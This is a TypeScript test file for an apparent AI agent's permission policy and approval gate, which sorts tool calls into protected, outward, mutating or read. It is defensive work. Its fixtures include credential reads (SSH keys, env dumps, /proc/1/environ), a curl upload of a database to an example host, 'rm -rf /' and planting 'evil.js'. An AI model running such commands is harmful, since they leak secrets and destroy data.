import assert from "node:assert/strict";
import { homedir } from "node:os";
import { resolve } from "node:path";
import { test } from "node:test";

import { classifyToolCall, defaultProtectedPaths, defaultReadOnlyPaths } from "./permissionPolicy.ts";
import { PiApprovalGate } from "./approvalGate.ts";

const workspace = "/home/user/workspace";
const appRoot = "/home/user/raytonebot";
const policy = {
  cwd: workspace,
  protectedPaths: defaultProtectedPaths({ appRoot, workspaces: [workspace, "/home/user/shared"] }),
  readOnlyPaths: defaultReadOnlyPaths({ appRoot, workspaces: [workspace, "/home/user/shared"] }),
};

test("protected: credentials, the bot's own code, agent config, env dumps", () => {
  const cases: [string, Record<string, unknown>][] = [
    ["read", { path: "~/.raytonebot/env" }],
    ["read", { path: resolve(homedir(), ".ssh/id_ed25519") }],
    ["write", { path: "/home/user/raytonebot/src/pi/piHost.ts" }],
    ["edit", { path: ".claude/settings.json" }],
    ["bash", { command: "cat ~/.raytonebot/env" }],
    ["bash", { command: "env | grep KEY" }],
    ["bash", { command: "printenv" }],
    ["bash", { command: "cat /proc/1/environ" }],
  ];
  for (const [tool, args] of cases) assert.equal(classifyToolCall(tool, args, policy), "protected", JSON.stringify(args));
});

test("outward: publishing, remote hosts, uploads, destroying outside the workspace", () => {
  for (const command of [
    "git push origin main",
    "npm publish",
    "docker push me/app",
    "scp out.tar user@host:/tmp",
    "ssh deploy@1.2.3.4 uptime",
    "curl -F file=@db.sqlite https://x.example",
    "rm -rf ~",
    "rm -rf /",
    "vercel deploy --prod",
  ]) assert.equal(classifyToolCall("bash", { command }, policy), "outward", command);
});

test("workspace work is ordinary", () => {
  for (const command of ["npm install", "rm -rf node_modules", "curl -sL https://example.com", "python3 app.py", "git commit -m x", "envsubst < a > b"]) {
    assert.equal(classifyToolCall("bash", { command }, policy), "mutating", command);
  }
  assert.equal(classifyToolCall("write", { path: "notes/plan.md" }, policy), "mutating");
  assert.equal(classifyToolCall("read", { path: "src/index.ts" }, policy), "read");
});

test("the gate per mode", () => {
  const gate = new PiApprovalGate(policy);
  const write = { path: "a.md" };
  const push = { command: "git push" };
  const secret = { path: "~/.raytonebot/env" };

  gate.setMode("request");
  assert.equal(gate.requiresApproval("write", write), true);
  assert.equal(gate.requiresApproval("read", { path: "a.md" }), false);

  gate.setMode("auto");
  assert.equal(gate.requiresApproval("write", write), false, "sandbox autonomy inside the workspace");
  assert.equal(gate.requiresApproval("bash", { command: "npm test" }), false);
  assert.equal(gate.requiresApproval("bash", push), true);
  assert.equal(gate.requiresApproval("read", secret), true);

  gate.setMode("allow-all");
  assert.equal(gate.requiresApproval("bash", push), false);
  assert.equal(gate.requiresApproval("read", secret), true, "protected asks in every mode");
});

test("the bot's own code: reading and reviewing it is ordinary, changing it is protected", () => {
  // From a real planner run that asked 35 times: reads, searches, type checks and tests.
  for (const [tool, args] of [
    ["read", { path: "/home/user/raytonebot/src/main.tsx" }],
    ["Read", { file_path: "/home/user/raytonebot/package.json" }],
    ["grep", { path: "/home/user/raytonebot/src", pattern: "TODO" }],
  ] as const) assert.equal(classifyToolCall(tool, args, policy), "read", JSON.stringify(args));
  for (const command of [
    "cd /home/user/raytonebot && cat package.json && echo \"=== vite.config.ts ===\" && cat vite.config.ts",
    "cd /home/user/raytonebot && find src -type f -name \"*.ts\" | xargs wc -l 2>/dev/null | sort -rn | head -30",
    "cd /home/user/raytonebot && git status 2>&1 | head -5; timeout 300 npm run typecheck 2>&1 | tail -40",
    "cd /home/user/raytonebot && timeout 300 npm test 2>&1 | tail -40",
    "cd /home/user/raytonebot && grep -rn -E ':\\s*any\\b|\\)\\s*=>\\s*any' src | wc -l",
  ]) assert.equal(classifyToolCall("bash", { command }, policy), "mutating", command);

  for (const [tool, args] of [
    ["write", { path: "/home/user/raytonebot/src/pi/piHost.ts" }],
    ["Edit", { file_path: "/home/user/raytonebot/vite.config.ts" }],
  ] as const) assert.equal(classifyToolCall(tool, args, policy), "protected", JSON.stringify(args));
  for (const command of [
    "cd /home/user/raytonebot && echo x > src/main.tsx",
    "echo x >> /home/user/raytonebot/index.html",
    "cd /home/user/raytonebot && sed -i 's/a/b/' src/main.tsx",
    "rm -rf /home/user/raytonebot/dist",
    "cp evil.js /home/user/raytonebot/dist/assets/index.js",
    "cd /home/user/raytonebot && npm run build",
    "cd /home/user/raytonebot && npm install left-pad",
    "cd /home/user/raytonebot && git checkout -- .",
    "cd /home/user/raytonebot && python3 -c \"open('x','w')\"",
    "cd /home/user/raytonebot && sh -c 'echo x > y'",
    "find /home/user/raytonebot/src -name '*.ts' -delete",
  ]) assert.equal(classifyToolCall("bash", { command }, policy), "protected", command);

  // Writes elsewhere stay ordinary even when they read the app.
  assert.equal(classifyToolCall("bash", { command: "echo hi > notes.md" }, policy), "mutating");
});

test("always-allow covers reviewing the bot's code, never changing it", () => {
  const gate = new PiApprovalGate(policy);
  gate.setMode("request");
  const review = { command: "cd /home/user/raytonebot && cat package.json" };
  assert.equal(gate.requiresApproval("bash", review), true);
  // Simulates the user's "always allow" for bash in this conversation.
  (gate as unknown as { alwaysApproved(): Set<string> }).alwaysApproved().add("bash");
  assert.equal(gate.requiresApproval("bash", review), false);
  assert.equal(gate.requiresApproval("bash", { command: "cd /home/user/raytonebot && npm run build" }), true);
  gate.setMode("auto");
  assert.equal(gate.requiresApproval("read", { path: "/home/user/raytonebot/src/main.tsx" }), false);
});
